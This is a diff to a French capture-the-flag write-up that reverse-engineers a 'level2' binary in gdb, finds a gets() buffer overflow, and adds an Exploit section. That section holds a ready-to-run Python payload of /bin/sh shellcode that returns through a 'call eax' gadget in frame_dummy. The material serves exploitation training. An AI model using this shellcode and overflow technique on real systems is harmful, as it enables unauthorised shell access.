@@ -22,11 +22,12 @@
   - `info function`
     ```asm
     [...]
+      0x080484b0  frame_dummy
       0x080484d4  p
       0x0804853f  main
     [...]
     ```
-    - on trouve une fonction p en plus du main
+    - on trouve une fonction p et une fonction frame_dummy en plus du main
   - `disas main`
     ```asm
     Dump of assembler code for function main:
@@ -45,6 +46,7 @@
     - <+11> ... <+12>
       - réinitialisation de la mémoire, fin d'exécution<br/><br/>
     - La fonction main() ne fait qu'appeler la fonction p()
+    - frame_dummy() n'est pas appelée
 - `disas p`
   ```asm
   Dump of assembler code for function p:
@@ -125,8 +127,36 @@ La fonction p() fait donc:
   - gets(ebp - 76) => attend un input
   - vérifie avec un filtre binaire et un cmp si l'eip commence par 0xb...
     - si c'est le cas:
-      - printf("%p\b", eip) => affiche la valeur du pointeur sur eip
+      - printf("%p\n", eip) => affiche la valeur du pointeur sur eip
       - exit(1) => quitte la fonction
     - sinon:
       - puts(ebp - 76) => affiche le retour du gets
-      - strdup(ebp - 76) => copie le retour du gets dans un malloc
+      - strdup(ebp - 76) => copie le retour du gets dans un malloc et le stocke dans eax
+
+## Exploit
+
+On sait qu'il y a un buffer overflow possible sur le gets, cependant le check au niveau de <p+44> nous empêche de réécrire l'EIP pour le faire pointer sur une fonction de la stack comme dans l'exercice précédent, il va falloir trouver un autre moyen de lancer notre exploit.
+
+Après quelques recherches dans les fonctions importées par le programme, on trouve un call à eax dans frame_dummy:
+
+- `gdb level2`
+  - `disas frame_dummy`
+    - ```asm
+      [...]
+        0x080484cf <+31>:	call   eax
+      [...]
+      ```
+Puisque le strdup() stocke son output dans eax, en théorie on peut écrire un exploit dans l'input du gets() et utiliser l'adresse du call eax découvert dans frame_dummy pour réécrire l'EIP !
+
+Nous créons donc un payload à l'aide du shellcode trouvé dans le lien suivant : http://shell-storm.org/shellcode/files/shellcode-219.php
+
+Auquel nous ajoutons des caractères de remplissage ici des A puis l'adresse du call eax pour réecrire l'EIP.
+
+```python
+sc = b""
+sc += b"\x31\xc0\x31\xdb\xb0\x06\xcd\x80"
+sc += b"\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80"
+sc += b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+print (sc + ((80 - len(sc)) * 'A') + '\xcf\x84\x04\x08')
+```
+Enfin nous lançons le programme avec le payload malicieux comme au level précédent.
